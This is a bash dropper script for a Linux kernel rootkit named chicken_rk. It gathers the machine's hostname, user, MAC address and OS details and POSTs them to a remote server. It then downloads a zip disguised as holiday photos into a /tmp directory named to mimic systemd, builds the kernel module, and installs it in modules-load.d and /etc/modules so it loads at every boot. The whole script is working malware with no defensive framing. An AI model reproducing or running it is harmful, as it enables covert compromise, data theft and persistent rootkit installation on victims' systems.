#!/bin/bash
ip="0.0.0.0"

url="http://$ip:3000/vacances/photos/rk.zip"

hostname=$(hostname)
user=$(whoami)
mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
os=$(uname -s)
os_version=$(uname -v)

# Manually construct JSON
jsoninfo="{\"hostname\":\"$hostname\", \"users\":\"$user\", \"mac\":\"$mac\", \"os\":\"$os\", \"os_version\":\"$os_version\"}"

# Specify the URL
json_url="http://$ip:3000/get-info"

# Send the JSON data using curl
curl -X POST "$json_url" -H "Content-Type: application/json" -d "$jsoninfo"

mkdir /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db
curl $url -o /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/ressources.zip

unzip /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/ressources.zip -d /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/


# compile the project
cd /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/chicken_rk2/src && make clean && make install

# copy driver to persistance location
mkdir /lib/modules/5.19.0-41-generic/kernel/drivers/chicken_rk
cp chicken_rk.ko /lib/modules/5.19.0-41-generic/kernel/drivers/chicken_rk/

echo "chicken_rk" > /etc/modules-load.d/chicken_rk.conf

# Update kernel modules dependencies
depmod -a

# /etc/modules coutain the list of module that will be load at boot time
echo "chicken_rk" >> /etc/modules
